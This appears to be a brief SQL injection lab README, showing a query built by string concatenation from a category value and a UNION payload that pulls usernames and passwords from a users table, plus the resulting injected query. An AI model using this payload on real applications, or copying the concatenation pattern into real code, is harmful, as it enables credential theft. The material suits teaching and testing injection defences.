# sql-injection-lab
``` sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

``` 
$sqlQuery = "SELECT a, b FROM products WHERE categories = + '" + $category + "'
```

``` sql
UNION SELECT username, password FROM users--'
```

``` sql
SELECT a, b FROM products WHERE categories = '' UNION SELECT username, password FROM users--'
```

